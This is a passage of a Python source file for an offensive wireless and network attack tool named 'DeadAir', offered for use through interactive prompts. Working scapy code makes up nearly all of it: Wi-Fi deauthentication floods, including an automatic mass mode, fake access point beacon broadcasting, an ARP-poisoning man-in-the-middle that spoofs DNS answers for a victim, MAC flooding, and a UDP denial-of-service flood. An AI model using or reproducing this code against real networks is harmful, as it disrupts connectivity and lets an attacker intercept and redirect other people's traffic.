								print ''+T+'        Client'+W+'      MAC: ' + ones.addr2 + '               BSSID: ' + ones.addr1 + ''+C+'  Type 1 Subtype 9'+W+''+G+' Now Associated'+W+'  '
				except TypeError:
					error=True
			for twos in twopackets_list:
				try:
					if twos.addr1 not in naclient_list:
						print ''+T+'        Client'+W+'      MAC: ' + twos.addr1 + '               BSSID: ' + twos.addr2 + ''+C+'  Type 2'+W+'  '
					else:
						naclient_list.remove(twos.addr1)
						print ''+T+'        Client'+W+'      MAC: ' + twos.addr1 + '               BSSID: ' + twos.addr2 + ''+C+'  Type 2'+W+''+G+' Now Associated'+W+'  '
				except TypeError:
					error=True
			for sixs in sixpackets_list:
				try:
					if sixs.addr2 not in naclient_list:
						print ''+T+'        Client'+W+'      MAC: ' + sixs.addr2 + '               BSSID: ' + sixs.addr1 + ''+C+'  Type 2 Subtype 4'+W+'  '
					else:
						naclient_list.remove(sixs.addr2)
						print ''+T+'        Client'+W+'      MAC: ' + sixs.addr2 + '               BSSID: ' + sixs.addr1 + ''+C+'  Type 2 Subtype 4'+W+''+G+' Now Associated'+W+'  '			
				except TypeError:
					error=True
			pint=False
	#Name: COMMotS
	
	#argvs
	#
	#argv1=bssid-----"0" = interactive menu
	#
	#argv2=target client----"0" = FF:FF:FF:FF:FF:FF
	#
	#arg3=Durration----"-1" = infinite
	#
	#arg4=Channel
	#
	#arg5=frequency
	#
	#arg6=interface
	
	#broad="ff:ff:ff:ff:ff:ff"
	
	#targ=sys.argv[2]
	
	ap_list=[]
	naclient_list=[]
	client_list=[]
	
	count=0
	
	if args.sniffer == "t" and menb == False:
		os.system("clear")
		print '['+T+'*'+W+']Press Ctrl+C to stop sniffer'
		print ""
		#print '*'*57 + '\n{0:5}\t{1:30}\t{2:30}\n'.format(''+T+'   CH#','BSSID','ESSID'+W+'') + '*'*57
		if chab == False:
			channel_hop = Process(target = channel_hopper, args=(args.interface,))
			channel_hop.start()
		elif chab == True:
			os.system("iwconfig %s channel %d" %(fac, cha))
		sniff(iface=args.interface, prn = PacketHandler, store=0)
		if chab == False:
			channel_hop.terminate()
		print ""
		print '['+R+'!'+W+'] Sniffer terminated'
		print ""
		sys.exit(0)
	
	if args.menu == "t" and snib == False:
		os.system("clear")
		print '['+T+'*'+W+']Press Ctrl+C to stop sniffer'
		print ""
		#print '*'*57 + '\n{0:5}\t{1:30}\t{2:30}\n'.format(''+T+'   CH#','BSSID','ESSID'+W+'') + '*'*57
		channel_hop = Process(target = channel_hopper, args=(args.interface,))
		if chab == False:
			channel_hop = Process(target = channel_hopper, args=(args.interface,))
			channel_hop.start()
		elif chab == True:
			os.system("iwconfig %s channel %d" %(fac, cha))
		sniff(iface=args.interface, prn = PacketHandler, store=0)
		if chab == False:
			channel_hop.terminate()
		print ""
		print '['+R+'!'+W+'] Sniffer terminated'
		print ""
		print"Enter target access point BSSID"
		try:
			acc=raw_input(''+T+'>>> '+W+'')
		except KeyboardInterrupt:
			print ""
			print '['+R+'!'+W+'] Good bye'
			sys.exit(0)
		print ""
		print("Enter target client MAC(0 = All clients associated with %s)" %(acc))
		try:
			cli=raw_input(''+T+'>>> '+W+'')
		except KeyboardInterrupt:
			print ""
			print '['+R+'!'+W+'] Good bye'
			sys.exit(0)
		print ""
		if cli == "0":
			cli="FF:FF:FF:FF:FF:FF"
		print"Enter number of packets to send(-1 = infinite)"
		try:
			tim=int(raw_input(''+T+'>>> '+W+''))
		except KeyboardInterrupt:
			print ""
			print '['+R+'!'+W+'] Good bye'
			sys.exit(0)
		print ""
		print"Enter target access point channel"
		try:
			cha=int(raw_input(''+T+'>>> '+W+''))
		except KeyboardInterrupt:
			print ""
			print '['+R+'!'+W+'] Good bye'
			sys.exit(0)
		print ""
		print("Changing %s to channel %d" %(fac, cha))
		os.system("iwconfig %s channel %d" %(fac, cha))
		print "Enter frequency of outgoing packets(0.1 is recommended)"
		try:
			fre=float(raw_input(''+T+'>>> '+W+''))
		except KeyboardInterrupt:
			print ""
			print '['+R+'!'+W+'] Good bye'
			sys.exit(0)
		print ""
		pkt = RadioTap() / Dot11(addr1=cli, addr2=acc, addr3=acc) / Dot11Deauth()
		os.system("clear")
		cli_to_ap_pckt = None
		limit=tim
		pkt = RadioTap() / Dot11(addr1=cli, addr2=acc, addr3=acc) / Dot11Deauth()
		while limit != 0:
			if cli != "0" : cli_to_ap_pckt = Dot11(addr1=acc, addr2=cli, addr3=acc) / Dot11Deauth()
			sendp(pkt, iface=fac, inter=fre)
			if cli != "0": send(cli_to_ap_pckt)
			count=count+1
			os.system("clear")
			print '            Interface: ' + fac
			print ("              Channel: %d" %(cha))
			print ("      Packet interval: %f" %(fre))
			print ("         Packets sent: %d" %(count))
			print '            Target AP: ' + acc
			print '        Target client: '+ cli
			print'''
	
	Stop with Ctrl+C
			'''
			limit=limit-1
		print '''
	
	          Complete
		'''
	
	else:
		limit=tim
	
		if cli=="0":
			cli="FF:FF:FF:FF:FF:FF"
		else:
			print cli
		if args.channel:
			print ("Changing interface to channel %d" %(cha))
			os.system("iwconfig %s channel %d" %(fac, cha))
		os.system("clear")
		cli_to_ap_pckt = None
		pkt = RadioTap() / Dot11(addr1=cli, addr2=acc, addr3=acc) / Dot11Deauth()
		if clib == False:
			cha=0
			channel_hop = Process(target = channel_hopper, args=(args.interface,))
			channel_hop.start()
		while limit != 0:
			try:
				if cli != "0" : cli_to_ap_pckt = Dot11(addr1=acc, addr2=cli, addr3=acc) / Dot11Deauth()
				sendp(pkt, iface=fac, inter=fre)
				if cli != "0": send(cli_to_ap_pckt)
				count=count+1
				os.system("clear")
				print '            Interface: ' + fac
				print ("              Channel: %d" %(cha))
				print ("      Packet interval: %f" %(fre))
				print ("         Packets sent: %d" %(count))
				print '            Target AP: ' + acc
				print '        Target client: '+ cli
				print'''
	
		Stop with Ctrl+C
				'''
				limit=limit-1
			except KeyboardInterrupt:
				if cha == 0:
					channel_hop.terminate()
				break
		print '''
	          Complete
		'''
def fakeAPClient():
	APlist = []
	print('1 - Generate multiple Access Points at once')
	print('2 - Generate one Access Point\n')
	choi = raw_input('FakeAP> ')
	if str(choi) == '1':
		shopb = ''
		shope = ''
		amnt = ''
		while str(amnt) == '':
			amnt = raw_input('[!] How many fake Access points to generate: ')
		for i in range(0, int(amnt)):
			BSSID = raw_input('Enter the '+G+'BSSID'+W+' of '+O+'AP'+W+' ' + str(i + 1) + ': ')
			ESSID = raw_input('Enter the '+C+'ESSID'+W+' of '+O+'AP'+W+' ' + str(i + 1) + ': ')
			AP = str(BSSID) + '|' + str(ESSID)
			APlist.append(AP)
		chan = raw_input('Enter the channel to use: ')
		fac = raw_input('Enter the interface to use: ')
		os.system('ifconfig ' + str(fac) + ' down')
		os.system('iwconfig ' + str(fac) + ' mode monitor')
		os.system('ifconfig ' + str(fac) + ' up')
		print('[!] Placed ' + str(fac) + ' in monitor mode')
		os.system("iwconfig %s channel %s" % (fac, chan))
		print('Channel set on interface ' + str(fac) + ' to ' + str(chan))
		freq = 0.001
		print('\nList of '+O+'AP'+W+'s to use:\n')
		for AP in APlist:
			b, e = AP.split('|')
			print('BSSID: '+G+'' + str(b) + ''+W+'	ESSID: '+C+'' + str(e) + ''+W+'')
		go = raw_input('\nPress enter to start...')
	else:
		bssid = raw_input('[!] Enter the BSSID to forge (random = random generation): ')
		shopb = str(bssid)
		essid = raw_input('[!] Enter the ESSID to forge (random = random generation): ')
		shope = str(essid)
		chan = raw_input('[!] Enter the channel to broadcast on: ')
		fac = raw_input('[!] Enter the interface to use: ' )
		freq = raw_input('[!] Enter the frequecy of outgoing packets(0.01 advised): ')
		os.system('ifconfig ' + str(fac) + ' down')
		os.system('iwconfig ' + str(fac) + ' mode monitor')
		os.system('ifconfig ' + str(fac) + ' up')
		print('[!] Placed ' + str(fac) + ' in monitor mode')
		os.system("iwconfig %s channel %s" % (fac, chan))
		print('Channel set on interface ' + str(fac) + ' to ' + str(chan))
	
	count = 0
	
	def gen():
		first = ''.join([random.choice('0123456789ABCDEF') for x in range(2)])
		second = ''.join([random.choice('0123456789ABCDEF') for x in range(2)])
		third = ''.join([random.choice('0123456789ABCDEF') for x in range(2)])
		fourth = ''.join([random.choice('0123456789ABCDEF') for x in range(2)])
		fifth = ''.join([random.choice('0123456789ABCDEF') for x in range(2)])
		sixth = ''.join([random.choice('0123456789ABCDEF') for x in range(2)])
		mac = str(first) + ':' + str(second) + ':' + str(third) + ':' + str(fourth) + ':' + str(fifth) + ':' + str(sixth)
		return(mac)
	
	def gen2():
		size=random.randint(1, 16)
		name=''.join([random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ') for x in range(int(size))])
		return(name)
	try:
		while 1:
			if str(shopb) == 'random' and str(choi) != '1':
				bssid = gen()
			if str(shope) == 'random' and str(choi) != '1':
				essid = gen2()
			if str(choi) != '1':
				frame = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=str(bssid), addr3 = str(bssid)) / Dot11Beacon(cap = 0x1104) / Dot11Elt(ID=0, info=str(essid)) / Dot11Elt(ID=1, info="\x82\x84\x8b\x96\x24\x30\x48\x6c") / Dot11Elt(ID=3, info="\x0b") / Dot11Elt(ID=5, info="\x00\x01\x00\x00")
				sendp(frame, iface = fac, inter = float(freq))
				count=count+1
				os.system("clear")
				print (''+O+'*****************************************'+W+'')
				print (''+T+'            Interface'+W+': '+G+'' + str(fac))
				print (''+T+'              Channel'+W+': '+G+'' + str(chan))
				print (''+T+'      Packet Interval'+W+': '+G+'' + str(freq))
				print (''+T+'         Packets Sent'+W+': '+G+'' + str(count))
				print (''+T+'         Forged BSSID'+W+': '+G+'' + str(bssid))
				print (''+T+'         Forged ESSID'+W+': '+G+'' + str(essid))
				print (''+O+'*****************************************'+W+'')
			elif str(choi) == '1':
				for AP in APlist:
					bssid, essid = AP.split('|')
					frame = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=str(bssid), addr3 = str(bssid)) / Dot11Beacon(cap = 0x1104) / Dot11Elt(ID=0, info=str(essid)) / Dot11Elt(ID=1, info="\x82\x84\x8b\x96\x24\x30\x48\x6c") / Dot11Elt(ID=3, info="\x0b") / Dot11Elt(ID=5, info="\x00\x01\x00\x00")
					sendp(frame, iface = fac, inter = float(freq))
					count=count+1
					os.system("clear")
					print (''+O+'*****************************************'+W+'')
					print (''+T+'            Interface'+W+': '+G+'' + str(fac))
					print (''+T+'              Channel'+W+': '+G+'' + str(chan))
					print (''+T+'      Packet Interval'+W+': '+G+'' + str(freq))
					print (''+T+'         Packets Sent'+W+': '+G+'' + str(count))
					print (''+T+'         Forged BSSID'+W+': '+G+'' + str(bssid))
					print (''+T+'         Forged ESSID'+W+': '+G+'' + str(essid))
					print (''+O+'*****************************************'+W+'')
	except:
		print('\n['+R+'!'+W+'] Exiting...')

def internalScanChoice():
	secondList = []
	thirdList = []
	fourthList = []
	aliveList = []
	printed = []
	interface = raw_input('[!] Enter the scanning interface: ')
	#ips = raw_input('[!] Enter the range of IP addresses to scan for: ')
	first = ''
	second = ''
	third = ''
	while str(first) == '':
		first = raw_input('[!] Enter the first octet of scanning range: ')
	second = raw_input('[!] Enter the second octet of scanning range(skip to scan ' + str(first) + '.*.*.*): ')
	if str(second) != '':
		secondList.append(int(second))
		third = raw_input('[!] Enter the third octet of scanning range(skip to scan ' + str(first) + '.' + str(second) + '.*.*): ')
	else:
		second = '*'
		third = '*'
		for i in range(1, 255):
			secondList.append(i)
			thirdList.append(i)
	if str(third) != '':
		thirdList.append(int(third))
		for i in range(1, 255):
			fourthList.append(i)
	else:
		third = '*'
		for i in range(1, 255):
			thirdList.append(i)
			fourthList.append(i)
	total = len(secondList) * len(thirdList) * len(fourthList)
	TO = raw_input('[!] Enter a packet timeout(skip for default(2)): ')
	if str(TO) == '':
		TO = 2
	inter = raw_input('[!] Enter notification interval(skip for default(10)): ')
	if str(inter) == '':
		inter = 10
	print('\n----------PARAMETERS----------\n')
	print('[!] Scanning range: ' + str(first) + '.' + str(second) + '.' + str(third) + '.*')
	print('[!] Addresses to scan: ' + str(total))
	print('[!] Packet timeout: ' + str(TO))
	print('[!] Notification interval: ' + str(inter))
	go = raw_input('\nPress enter to start scanning for internal IP addresses...')
	print('\n[!] ARP Scanning...')
	start_time = datetime.now()
	monStatic = 0
	mon = 0
	count = 0
	for s in secondList:
		for t in thirdList:
			for f in fourthList:
				ip = str(first) + '.' + str(s) + '.' + str(t) + '.' + str(f)
				ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout = float(TO), iface = interface, inter = 0.1)
				monStatic = monStatic + 1
				mon = mon + 1
				if mon >= int(inter):
					print(str(monStatic) + '/' + str(total))
					mon = 0
				for snd,rcv in ans:
					if rcv not in printed:
						count = count + 1
						print rcv.sprintf(r"%Ether.src% - %ARP.psrc%")
						printed.append(rcv)
	stop_time = datetime.now()
	total_time = stop_time - start_time
	print('[!] Scan Complete!')
	print('[!] Scan Duration: ' + str(total_time) + ' | Living hosts: ' + str(count))

def DNSspoofChoice():
	global targetIP
	global interface
	global gateIP
	global MyMAC
	posion_table = []
	domain = ''
	while str(domain) != '?':
		domain = ''
		while str(domain) == '':
			domain = raw_input('[!] Enter domain name to redirect(\'?\' when done): ')
		IPaddr = ''
		if str(domain) != '?':
			while str(IPaddr) == '':
				IPaddr = raw_input('[!] Enter IP address to redirect to: ')
		if str(domain) != '?':
			entry = str(domain) + ':' + str(IPaddr)
			posion_table.append(entry)
	MyMAC = ''
	while str(MyMAC) == '':
		MyMAC = raw_input('[!] Enter the MAC address of the attacking machine: ')
	try:
		interface = raw_input('[!] Enter your sniffing Interface: ')
		targetIP = raw_input('[!] Enter Victim IP: ')
		gateIP = raw_input('[!] Enter Router IP: ')
		print('\n[!] Poisoning table:\n')
		for entry in posion_table:
			print(entry)
		go = raw_input('\n[!] Press enter to start attack')
		monIP = targetIP
		print('\n\n\n')
	except KeyboardInterrupt:
		print ('[!] Exiting...')
		
		sys.exit(1)
	global s
	print('[!] Using interface: ' + str(interface))
	print('[!] Using gateway address: ' + str(gateIP))
	print('[!] Using target address: ' + str(targetIP))
	def get_mac(IP):
		conf.verb = 0
		ans, unans = srp(Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
		for snd,rcv in ans:
			return rcv.sprintf(r'%Ether.src%')
	def restore():
		print ('\n[!] Restoring original ARP caches...')
		victimMAC = get_mac(targetIP)
		gateMAC = get_mac(gateIP)
		send(ARP(op = 2, pdst = gateIP, psrc = targetIP, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc = victimMAC), count = 7)
		send(ARP(op = 2, pdst = targetIP, psrc = gateIP, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc = gateMAC), count = 7)
		print ('[!] Exiting...')
		sys.exit(1)
	def trick(gm, vm):
		send(ARP(op = 2, pdst = targetIP, psrc = gateIP, hwdst= vm))
		#send(ARP(op = 2, pdst = gateIP, psrc = targetIP, hwdst= gm))
	def packetHandler(pkt):
		global s
		global interface
		global targetIP
		global gateMAC
		global MyMAC
		global victimMAC
		global gateIP
		if IP in pkt:
			if pkt[Ether].src == victimMAC:
				sause = pkt[Ether].src
				if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
					ip = pkt['IP']
					udp = pkt['UDP']
					dns = pkt['DNS']
					qname = dns.qd.qname
					domain = qname[:-1]
					for entry in posion_table:
						dom, ipp = entry.split(':')
						if domain.lower() in str(dom):
							print('[!] Found target query')
				                	posion_ip = ipp
				                	pkt_ip = IP(src=ip.dst,
				                	            dst=ip.src)					
					                pkt_udp = UDP(sport=udp.dport, dport=udp.sport)
					                pkt_dns = DNS(id=dns.id,
					                              qr=1,
					                              qd=dns.qd,
					                              an=DNSRR(rrname=qname, rdata=posion_ip))
							print(''+G+'DNS QUERY '+W+'for '+G+'' + pkt.getlayer(DNS).qd.qname + ''+W+' from ' + str(sause) + '|' + pkt[IP].src + ''+P+' responded with'+R+' ' + str(ipp) + ''+W+'')
					
					                send(pkt_ip/pkt_udp/pkt_dns)
						else:
							print(''+P+'DNS QUERY '+W+'for '+R+'' + pkt.getlayer(DNS).qd.qname + ''+W+' from ' + str(sause) + '|' + pkt[IP].src + ' -> ' + pkt[Ether].dst + '|' + pkt[IP].dst)
							sause = pkt[Ether].src
							s = conf.L2socket(iface=interface)
							pkt[Ether].dst = gateMAC
							pkt[Ether].src = MyMAC
							#sendp(fragment(pkt), verbose=0)
							s.send(pkt)
							s.close()
				else:
					print('Wireless packet from ' + str(sause) + '|' + pkt[IP].src + ' -> ' + pkt[Ether].dst + '|' + pkt[IP].dst)
					sause = pkt[Ether].src
					s = conf.L2socket(iface=interface)
					pkt[Ether].dst = gateMAC
					pkt[Ether].src = MyMAC
					#sendp(fragment(pkt), verbose=0)
					s.send(pkt)
					s.close()
			# Packets destined to the victim are forwarded
			elif pkt[IP].dst == targetIP:
				sause = pkt[Ether].src
				s = conf.L2socket(iface=interface)
				pkt[Ether].dst = victimMAC
				pkt[Ether].src = MyMAC
				#sendp(fragment(pkt), verbose=0)
				s.send(pkt)
				s.close()
				if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
					print(''+P+'DNS QUERY '+W+'for '+R+'' + pkt.getlayer(DNS).qd.qname + ''+W+' from ' + str(sause) + '|' + pkt[IP].src + ' -> ' + pkt[Ether].dst + '|' + pkt[IP].dst)
				else:
					print('Wireless packet from ' + str(sause) + '|' + pkt[IP].src + ' -> ' + pkt[Ether].dst + '|' + pkt[IP].dst)
#			if (pkt[IP].dst == gateIP) and (pkt[Ether].dst == MyMAC):
#				print('[!] Found packet to gateway')
#	        		pkt[Ether].dst = gateMAC
#				print('[!] Crafted new packet')
#	        		sendp(pkt)
#				print(pkt[Ether].src + '|' + pkt[IP].src + ' -> ' + pkt[Ether].dst + '|' + pkt[IP].dst)
#				print('[!] Sent the packet')
#
#	        		print('Wireless packet from ' + pkt[IP].src + ' has been forwarded -> ' + pkt[IP].dst)
#			else:
#				print(pkt[IP].dst)
#				pkt[Ether].dst = gateMAC
#				print('[!] Crafted new packet')
#	        		sendp(pkt)
#				print(pkt[Ether].src + '|' + pkt[IP].src + ' -> ' + pkt[Ether].dst + '|' + pkt[IP].dst)
#				print('[!] Sent the packet')
		else:
			#print('[!] Non-TCP/IP packet')
			cool = False
	def sniffer():
		try:
			print('[!] Sniffing and forwarding packets...')
			filter = "ip"
			sniff(filter = filter, prn = packetHandler, store = 0)
		except KeyboardInterrupt:
			sys.exit()
	def mitm():
		global gateMAC
		global victimMAC
		try:
			victimMAC = get_mac(targetIP)
		except Exception:
			os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
			print ('[!] Couldn\'t resolve target MAC address')
			print ('[!] Exiting...')
			sys.exit(1)
		try:
			gateMAC = get_mac(gateIP)
		except Exception:
			os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
			print ('[!] Couldn\'t resolve gateway MAC address')
			print ('[!] Exiting...')
			sys.exit(1)
		print('[!] Starting sniffing thread')
		thread = threading.Thread(target=sniffer)
		thread.daemon=True
		try:
			thread.start()
		except KeyboardInterrupt:
			print('[!] Stopping sniffer thread')
		
		print ('[!] Stop with Ctrl+C | Poisoning ARP caches...')
		while 1:
			try:
				trick(gateMAC, victimMAC)
				time.sleep(0.1)
			except KeyboardInterrupt:
				restore()
				break
	mitm()

def MACfloodChoice():
	inter = raw_input('[!] Enter the interface you will be using: ')
	def RandMAC():
		first = ''.join([random.choice('0123456789ABCDEF') for x in range(2)])
		second = ''.join([random.choice('0123456789ABCDEF') for x in range(2)])
		third = ''.join([random.choice('0123456789ABCDEF') for x in range(2)])
		fourth = ''.join([random.choice('0123456789ABCDEF') for x in range(2)])
		fifth = ''.join([random.choice('0123456789ABCDEF') for x in range(2)])
		sixth = ''.join([random.choice('0123456789ABCDEF') for x in range(2)])
		mac = str(first) + ':' + str(second) + ':' + str(third) + ':' + str(fourth) + ':' + str(fifth) + ':' + str(sixth)
		return(mac)
	monitor = 100
	monCount = 0
	staticCount = 0
	print('[!] Flooding...')
	error = False
	try:
		while 1:
			src_mac = RandMAC()
			try:
				sendp(Ether(src=src_mac, dst="FF:FF:FF:FF:FF:FF")/ARP(op=2, psrc="0.0.0.0", hwsrc=src_mac, hwdst="FF:FF:FF:FF:FF:FF")/Padding(load="X"*18), verbose=0)
				if error == True:
					print('[!] Flooding continues...')
				error = False
				monCount = monCount + 1
				staticCount = staticCount + 1
				if monCount >= monitor:
					monCount = 0
					print('Frames sent: ' + str(staticCount))
			except:
				if error == False:
					print('[!] Socket error...restarting interface')
					os.system('ifconfig ' + str(inter) + ' down')
					os.system('ifconfig ' + str(inter) + ' up')
					error = True
	except KeyboardInterrupt:
		print('\n[!] Exiting...')

def UDPfloodChoice():
	
	sent=0
	sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
	sz = raw_input('[!] Enter the size (in bytes) for the payload (skip for default(1024)): ')
	if str(sz) != '':
		size = int(sz)
		bytes = random._urandom((int(sz)-64)+64) #Creates packet
	else:
		size = 1024
		bytes=random._urandom((1024-64)+64) #Creates packet
	ip=raw_input('[!] Enter the target IP address: ')
	#port=input('Port: ') #Port we direct to attack
	t1 = datetime.now()
	port=raw_input('[!] Enter target port(skip to use all ports): ')
	if str(port) != '':
		port = int(port)
		resp = (''+R+'port '+O+'' + str(port))
	#	print ('['+R+'!'+W+'] Sending packets to '+R+'' + ip + ''+W+' : Stop with Ctrl+C')
	else:
		port=1
		resp = (''+O+'all '+R+'ports')
	print (''+R+'----------Sending '+O+'' + str(size) + ''+R+' byte packets to '+O+'' + str(ip) + ''+R+' on '+O+'' + resp + ''+R+'----------'+W+'')
	print
	try:
		while 1: #Infinitely loops sending packets to the port until the program is exited.
			#print(bytes)
			if str(port) != '':
				#print(port)
				port = port
			else:
				if port == 65535:
					port=1
				port = randint(1, 65500)
			#print (port)
			sock.sendto(bytes,(ip,port))
			#UNCOMMENT THE NEXT LINE FOR PYTHON2.*
			#print('['+G+'+'+W+'] Packets sent: ' + str(sent))
			#UNCOMMENT THE NEXT LINE FOR PYTHON3.*
			#print('['+G+'+'+W+'] Packets sent: ' + str(sent), end="\r")
			#print "Sent %s amount of packets to %s at port %s." % (sent,ip,port)
			sent= sent + 1
			#if args.port:
			#    port=args.port
			#else:
			#    port=port+1
	except KeyboardInterrupt:
		t2 = datetime.now()
		t3 = t2 - t1
		print('')
		print (''+R+'----------Sent '+O+'' + str(sent) + ''+R+' packets to '+O+'' + ip + ''+R+' in '+O+'' + str(t3) + ''+R+'----------'+W+'')
		print

def massChoice():
	observedclients = []
	filtList = []
	APfiltList = []
	def deauther(paddr2, paddr1, type, subtype):
		try:
			if paddr1 != 'ff:ff:ff:ff:ff:ff':
				print('[!] [' + str(datetime.now().time()) + '] Attacker started: ' + str(paddr2) + ' spoofing with ' + str(paddr1) + ' | type ' + str(type) + '  subtype ' + str(subtype))
				count = 0
				monCount = 100
				staticCount = 0
				while 1:
					sendp(RadioTap()/Dot11(type=0,subtype=12,addr1=paddr2,addr2=paddr1,addr3=paddr1)/Dot11Deauth(), verbose = 0, inter = 0.001)
					staticCount = staticCount + 1
					count = count + 1
					if count >= monCount:
						count = 0
						print('[!] [' + str(datetime.now().time()) + '] ' + str(paddr2) + ' Frames sent: ' + str(staticCount))
					#print('[!] Sent dauthentication frame: ' + str(paddr2))
		except KeyboardInterrupt:
			sys.exit()
	filt = ''
	APfilt = ''
	while str(filt) != '?':
		filt = raw_input('[!] Enter the MAC addresses of specific victims to attack(\'?\' when done): ')
		if filt != '?':
			filtList.append(filt)
	if len(filtList) == 0:
		while str(APfilt) != '?':
			APfilt = raw_input('[!] Enter the the specific BSSIDs to attack(\'?\' when done): ')
			if APfilt != '?':
				APfiltList.append(APfilt)
	
	interface = raw_input('[!] Enter your sniffing/attacking interface: ')

	def channel_hopper(interfac):
		channel=1
		while True:
			while channel < 15:
				try:
					os.system("iwconfig %s channel %d" % (interfac, channel))
					#print channel
					channel=channel+1
					time.sleep(1)
					if channel == 15:
						channel=1
				except KeyboardInterrupt:
					print ""
					print '['+T+'*'+W+'] Terminating sniffer'
					break

	cha = raw_input('[!] Enter the channel to use(skip to use all channels): ')
	if str(cha) == '':
		print('[!] Using all channels')
		thread = threading.Thread(target=channel_hopper, args=(interface,))
		thread.daemon=True
		try:
			thread.start()
		except KeyboardInterrupt:
			print('[!] Stopping hopper')
	else:
		os.system('iwconfig ' + str(interface) + ' channel ' + str(cha))
		print('[!] Set ' + str(interface) + ' to channel ' + str(cha))
	def sniffmgmt(p):
		stamgmtstypes = (0, 2, 4)
		if p.haslayer(Dot11):
#			if p.type == 0 and p.subtype in stamgmtstypes:
			if p.type == 0 and p.subtype != 8 or p.type == 2:
				if p.addr2 not in observedclients:
					#print('[!] Got Probe request from ' + str(p.addr2))
					if len(APfiltList) != 0:
						if p.addr1 in APfiltList:
							if p.addr1 != 'ff:ff:ff:ff:ff:ff':
								observedclients.append(p.addr2)
							thread = threading.Thread(target=deauther, args=(p.addr2, p.addr1, p.type, p.subtype))
							thread.daemon=True
							try:
								thread.start()
							except KeyboardInterrupt:
								print('[!] Stopping sniffer thread')
					elif len(filtList) == 0:
						if p.addr1 != 'ff:ff:ff:ff:ff:ff':
							observedclients.append(p.addr2)
						thread = threading.Thread(target=deauther, args=(p.addr2, p.addr1, p.type, p.subtype))
						thread.daemon=True
						try:
							thread.start()
						except KeyboardInterrupt:
							print('[!] Stopping sniffer thread')
					else:
						if p.addr2 in filtList:
							if p.addr1 != 'ff:ff:ff:ff:ff:ff':
								observedclients.append(p.addr2)
							thread = threading.Thread(target=deauther, args=(p.addr2, p.addr1, p.type, p.subtype))
							thread.daemon=True
							try:
								thread.start()
							except KeyboardInterrupt:
								print('[!] Stopping sniffer thread')
	
	print('[!] Sniffer started\n')
	sniff(iface=interface, prn=sniffmgmt, store = 0)

def honeypotChoice():
	def catch(bssd, esid):
		print('[!] Started sniffer')	
		observedclients = []
		def sniffmgmt(p):
			if p.haslayer(Dot11):
				if p.type == 0 and p.subtype != 8:
					try:
						if p.info != esid:
							if str(ty) == '1':
								print('[!] got management frame from: ' + str(p.addr2) + ' -> ' + str(p.info))
						else:
							#print('['+G+'+'+W+'] [' + str(datetime.now().time()) + '] Caught one: '+G+'' + str(p.addr2) + ''+W+' -> '+O+'' + str(p.info) + ''+W+'')
							cool = True
					except:
						#print('[!] Ran into exception')
						exception = True
					try:
						if p.info == str(esid):
							if p.addr2 not in observedclients:
								print('['+G+'+'+W+'] [' + str(datetime.now().time()) + '] Caught one: '+G+'' + str(p.addr2) + ''+W+' -> '+O+'' + str(p.info) + ''+W+'')
								observedclients.append(p.addr2)
					except:
						add = False
		sniff(iface=fac, prn=sniffmgmt, store = 0)
	print('1 - Verbose sniffing output')
	print('2 - Conservative sniffing output')
	ty = raw_input('\ntype> ')
	enc = raw_input('[!] Would you like the network to appear to have security? (y/n): ')
	bssid = raw_input('[!] Enter the BSSID to forge (random = random generation): ')
	shopb = str(bssid)
	essid = raw_input('[!] Enter the ESSID to forge (random = random generation): ')
	shope = str(essid)
	chan = raw_input('[!] Enter the channel to broadcast on: ')
	fac = raw_input('[!] Enter the interface to use: ' )
	freq = raw_input('[!] Enter the frequecy of outgoing packets(0.01 advised): ')
	os.system('ifconfig ' + str(fac) + ' down')
	os.system('iwconfig ' + str(fac) + ' mode monitor')
	os.system('ifconfig ' + str(fac) + ' up')
	print('[!] Placed ' + str(fac) + ' in monitor mode')
	os.system("iwconfig %s channel %s" % (fac, chan))
	print('Channel set on interface ' + str(fac) + ' to ' + str(chan))
	thread = threading.Thread(target=catch, args=(shopb, essid,))
	thread.daemon=True
	try:
		thread.start()
	except KeyboardInterrupt:
		print('[!] Stopping sniffer thread')
	print('[!] Broadcasting access point')
	while 1:
		if str(enc) == 'n':
			frame = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=str(bssid), addr3 = str(bssid)) / Dot11Beacon(cap = 0x0100) / Dot11Elt(ID=0, info=str(essid)) / Dot11Elt(ID=1, info="\x82\x84\x8b\x96\x24\x30\x48\x6c") / Dot11Elt(ID=3, info="\x0b") / Dot11Elt(ID=5, info="\x00\x01\x00\x00")
		else:
			frame = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=str(bssid), addr3 = str(bssid)) / Dot11Beacon(cap = 0x1104) / Dot11Elt(ID=0, info=str(essid)) / Dot11Elt(ID=1, info="\x82\x84\x8b\x96\x24\x30\x48\x6c") / Dot11Elt(ID=3, info="\x0b") / Dot11Elt(ID=5, info="\x00\x01\x00\x00")
		try:
			sendp(frame, iface = fac, inter = float(freq))
		except:
			print('[!] Error')
					

def main():
	choice = ''
	titl = True
	while str(choice) != '0':
		print(''+W+'')
		if titl == True:
			print('''
******************************************************************

Welcome to the DeadAir wireless tool | Developed By: @the.red.team

	   Enter 'help' to view the list of options

*******************************************************v2.1*******
''')


#		print('''
#8888888b.                         888        d8888 d8b         
#888  "Y88b                        888       d88888 Y8P         
#888    888                        888      d88P888             
#888    888  .d88b.   8888b.   .d88888     d88P 888 888 888d888 
#888    888 d8P  Y8b     "88b d88" 888    d88P  888 888 888P"   
#888    888 88888888 .d888888 888  888   d88P   888 888 888     
#888  .d88P Y8b.     888  888 Y88b 888  d8888888888 888 888     
#8888888P"   "Y8888  "Y888888  "Y88888 d88P     888 888 888     
#                                                               v2.1
#
#''')
		choice = raw_input(''+R+'DeadAir'+W+'> '+G+'')
		titl = False
		print(''+W+'')
		if str(choice) == 'help':
#			print(''+O+'Developed By'+W+': '+G+'@the.red.team'+W+'\n\n')
